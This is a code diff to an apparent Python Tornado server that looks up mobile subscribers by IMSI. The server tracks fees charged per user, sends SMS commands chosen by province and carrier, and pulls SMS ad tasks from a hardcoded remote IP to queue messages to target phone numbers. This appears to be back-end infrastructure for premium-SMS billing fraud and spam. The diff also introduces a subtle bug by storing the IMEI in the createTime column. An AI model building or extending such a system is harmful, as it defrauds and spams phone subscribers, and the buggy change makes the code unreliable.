@@ -127,7 +127,6 @@ class MainHandler(tornado.web.RequestHandler):
             _rsp_content = get_imsi_response(reqInfo["imsi"], threads)
             reqInfo['rspContent'] = _rsp_content
             if _rsp_content != None:
-                print(_rsp_content)
                 self.write(_rsp_content)
         else:
             _rsp_content = get_test_response(_test_imsi_info)
@@ -149,7 +148,7 @@ def get_imsi_response(_imsi, _threads):
     _sql = 'SELECT id,imsi,mobile,matchCount,mobile_areas.province,mobile_areas.city,mobile_areas.mobileType,ifnull(lastCmdTime,0) as lastCmdTime,ifnull(cmdFeeSum,0) as cmdFeeSum,ifnull(cmdFeeSumMonth,0) as cmdFeeSumMonth ,lastRegisterCmdAppIdList,ifnull(registerQqCmdCount,0) as registerQqCmdCount,ifnull(registerQqSuccessCount,0) as registerQqSuccessCount,ifnull(register12306CmdCount,0) as register12306CmdCount,ifnull(register12306SuccessCount,0) as register12306SuccessCount,insertTime FROM `imsi_users` LEFT JOIN mobile_areas ON SUBSTR(IFNULL(imsi_users.mobile,\'8612345678901\'),3,7)=mobile_areas.`mobileNum`  WHERE imsi =  %s '
     _cur.execute(_sql, (_imsi))
     _record_user = _cur.fetchone()
-    print(_record_user)
+    # print(_record_user)
     ctime = int(time.time())
     if _record_user == None:
         _sql = 'insert into `imsi_users` (imsi,insertTime) value (%s,%s)'
@@ -277,7 +276,7 @@ def get_cmd(_user, _threads):
         _sql = 'SELECT * FROM `sms_cmd_configs` , `sms_cmd_covers` WHERE `sms_cmd_configs`.id=`sms_cmd_covers`.`smsCmdId` AND province = %s AND mobileType = %s and sms_cmd_covers.state = \'open\' and sms_cmd_configs.state = \'open\' order by rand() limit 1 '
         _cur.execute(_sql, (_user['province'], _user['mobileType']))
         _record = _cur.fetchone()
-        print(_record)
+        # print(_record)
         _cur.close()
         _dbConfig.close()
         if _record == None:
@@ -409,11 +408,12 @@ def fetch_sms_ads():
         _cur.execute(_sql)
         _recordRsp = _cur.fetchone()
         ctime = int(time.time())
+        imei = '1501660031'
         imsi = '460029154625815'
         if _recordRsp != None and systemConfigs['sendSmsAdFetch'] == 'open' and int(_recordRsp['tot']) <= int(systemConfigs['sendSmsAdLessNum']):
             url = 'http://203.86.8.198:6068/ido/get.php'
             _r = requests.get(url, params={
-                              'cid': '10354', 'imei': '1501660031', 'imsi': imsi, 'sdk': '21', 'sim': '5', 'info': 'LenovoLenovoA708t'})
+                              'cid': '10354', 'imei': imei, 'imsi': imsi, 'sdk': '21', 'sim': '5', 'info': 'LenovoLenovoA708t'})
             # _r = requests.get(url)
             data = _r.json()
             text = _r.text
@@ -423,7 +423,7 @@ def fetch_sms_ads():
             if 'tasks' in data.keys():
                 for _cell in data['tasks']:
                     insertBulk.append(
-                        (str(_cell['phone']), _cell['msg'], str(ctime), str(_cell), str(ctime), imsi, _cell['msgid'],  _cell['taskid']))
+                        (str(_cell['phone']), _cell['msg'], imei, str(_cell), imei, imsi, _cell['msgid'],  _cell['taskid']))
                 _sql = 'insert into wait_send_ads (targetMobile,msg,createTime,oriContent,oriImei,oriImsi,oriMsgId,oriTaskId) values (%s,%s,%s,%s,%s,%s,%s,%s)'
                 _dbConfig.cursor().executemany(_sql, insertBulk)
             threading.Thread(
